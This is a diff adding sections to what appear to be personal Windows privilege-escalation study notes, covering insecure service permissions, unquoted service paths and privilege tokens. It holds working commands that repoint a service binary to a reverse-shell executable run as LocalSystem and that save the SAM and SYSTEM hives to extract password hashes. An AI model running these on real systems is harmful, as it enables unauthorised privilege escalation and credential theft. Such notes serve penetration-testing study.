@@ -61,16 +61,44 @@ Windows services are managed by the **Service Control Manager (SCM)**. The SCM i
 	C:\> sc stop windowsscheduler
 	C:\> sc start windowsscheduler
 	```
-### + look for Services in Registry:
+	
+### + Insecure Service Permissions: 	
+there is a chance even if binary is well protected on DACL. we should check service DACL(not binary DACL)
+```ps1
+# check for service reconfiguration
+accesschk64.exe -qlc VULNservice
+# reconfigure the service to point to our executable. 
+sc config VULNservice binPath= "C:\PATH\TO\reverseSHELL.exe" obj= LocalSystem
+```
+
+### + Unquoted Service Paths:
+```ps1
+# query the service and see if the executable path is unquoted (BINARY_PATH_NAME)
+C:\> sc qc "vncserver"
+```
+
+### You can look for Services in Registry:
 	 HKLM\SYSTEM\CurrentControlSet\Services\	
 	
 ### + Know that: 
 Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service,
 
 
+# Dangerous Tokens
+find all the windows tokens with their meanings [Here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants), find more about hot to exploit it [here](https://github.com/gtworek/Priv2Admin)
 
-	
+## SeBackup / SeRestore:
+The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. attacker can copy the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
+	+ backup SAM and SYSTEM hashes:
+	```ps1
+	reg save hklm\system C:\anywhere\system.hive
+	reg save hklm\sam C:\anywhere\sam.hive
+	```
 
+
+## SeTakeOwnership:	
+
+## SeImpersonate / SeAssignPrimaryToken:
 
 
 
